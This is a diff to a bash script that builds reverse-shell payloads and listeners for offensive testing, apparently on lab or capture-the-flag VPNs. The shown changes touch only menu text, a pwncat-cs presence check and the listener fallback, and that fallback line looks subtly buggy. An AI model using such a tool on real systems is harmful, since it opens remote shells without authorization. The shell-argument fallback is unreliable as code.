@@ -6,11 +6,15 @@ green='\033[1;32m'
 blue='\033[1;34m'
 white='\033[1;37m'
 yellow='\033[1;33m'
+##Assuming pwncat is not on the system
+pwncat=0
 
-if [ "$EUID" -ne 0 ]
-  then echo -e "${white}Please run as root."
-  exit
-fi 
+#Checking for pwncat-cs directory
+DIR="/opt/pwncat"
+if [ -d "$DIR" ]; then
+  #Since Bash doesn't have boolean
+  pwncat=1
+fi
 
 #IP Address finder
 IP=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}' --color=none)
@@ -76,13 +80,21 @@ if [ "$1" == "" ]; then
 ##Help Menu 
 elif [ "$1" = "help" ]; then 	
 	echo -e "${yellow}Option 1:\n1. Python\n2. Bash\n3. PHP\n4. Netcat\n"
-	echo -e "${hellow}Option 2:\n1. Netcat(Default)\n2. Pwncat-cs\n"
+	echo -e "${yellow}Option 2:\n1. Netcat(Default)\n2. Pwncat-cs\n"
 	echo -e 'Usage: rs <language> <listener>'
 	echo -e 'Example: rs 1 2\n\t For a python payload and pwncat-cs listener.'
 	echo -e 'Example: rs 3 2\n\t For a php payload and pwncat-cs listener.'
+fi
+
+#Making sure pwncat-cs exists on system
+if [ "$2" = 2 ] && [ $pwncat = 0 ]; then
+	echo -e "${red}Pwncat-cs is not on the system and cannot be used as a listener, switching to default listener(netcat)."
+	sleep 2
+	set "$2" 1
+fi
 
 ##Python Caller
-elif [ "$1" = 1 ]; then
+if [ "$1" = 1 ]; then
 	if [ "$2" = 1 ] || [ "$2" = "" ]; then
 		payloadmaker Python Netcat
 	elif [ "$2" = 2 ]; then
